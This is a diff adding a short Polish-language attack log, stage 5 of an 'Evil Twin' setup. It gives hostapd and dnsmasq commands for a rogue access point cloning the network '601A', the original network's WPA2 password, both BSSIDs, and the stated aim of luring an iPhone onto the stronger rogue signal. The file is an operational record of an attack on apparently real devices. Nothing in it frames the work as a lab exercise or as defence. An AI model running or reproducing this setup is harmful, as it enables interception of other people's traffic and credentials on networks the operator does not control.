@@ -1,0 +1,13 @@
+# ETAP 5 — Evil Twin 601A z DHCP (poprawny)
+## Komendy
+hostapd -B /tmp/evil601a.conf (SSID=601A, WPA2-PSK, kanal 4)
+dnsmasq --interface=wlan0 --dhcp-range=192.168.200.50,192.168.200.150,12h
+## Status
+Evil Twin AP dziala: BSSID 5e:b9:3e:65:a9:e9, kanal 4
+DHCP dziala (dnsmasq)
+Haslo: nbi8-yhs5-ajxp (takie samo jak oryginalna 601A)
+## Oczekiwany rezultat
+Urzadzenia powinny zobaczyc dwa AP z SSID 601A:
+- Oryginal: 7C:F1:7E:C1:7B:95 (~ -40 dBm)
+- Evil Twin: 5e:b9:3e:65:a9:e9 (~ -20 dBm)
+Silniejszy sygnal Evil Twin powinien sprawic ze iPhone przełączy się do nas.
